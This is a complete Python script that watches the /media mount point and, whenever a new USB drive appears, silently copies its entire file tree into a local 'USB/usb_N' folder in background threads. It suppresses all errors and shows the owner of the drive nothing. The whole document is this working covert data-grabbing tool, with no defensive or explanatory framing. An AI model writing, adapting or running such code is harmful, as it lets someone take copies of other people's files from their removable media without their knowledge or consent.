#!/usr/bin/env python3

import os
from threading import Thread
import time


class CopyPasteUSBContent:

    def __init__(self):
        self.num = 0
        self.KEY_DETECTED = []
        self.Path = self._location_usb()

    def _location_usb(self):
        name = os.listdir("/media")[0]
        return os.path.join("/media", name)

    def _copy(self, file_from_usb, file_copy):
        try:
            with open(file_from_usb, "rb") as f1, open(file_copy, "wb") as f2:
                f2.write(f1.read())
        except Exception:
            pass

    def _create_dir(self, path):
        if not os.path.isdir(path):
            os.makedirs(path)

    def _run(self, path, hidden_dir):
        for f in os.listdir(path):
            if os.path.isfile(os.path.join(path, f)):
                self._copy(os.path.join(path, f), os.path.join(hidden_dir, f))
            if os.path.isdir(os.path.join(path, f)):
                sub_dir = os.path.join(path, f)
                hidden_sub = os.path.join(hidden_dir, f)
                self._create_dir(hidden_sub)
                self._run(sub_dir, hidden_sub)

    def start(self):
        while True:
            time.sleep(2)
            usb_connected = os.listdir(self.Path)
            if len(usb_connected) != 0:
                for key in usb_connected:
                    if key not in self.KEY_DETECTED:
                        usb_number = "usb_" + str(self.num)
                        try:
                            usb_path = os.path.join(self.Path, key)
                            location_dir = os.path.join(os.getcwd(), "USB", usb_number)
                            self.num += 1
                            self.KEY_DETECTED.append(key)
                            self._create_dir(location_dir)
                            thread = Thread(target=self._run, args=(usb_path, location_dir))
                            thread.start()
                        except Exception:
                            pass
                    else:
                        continue


if __name__ == "__main__":
    cp = CopyPasteUSBContent()
    cp.start()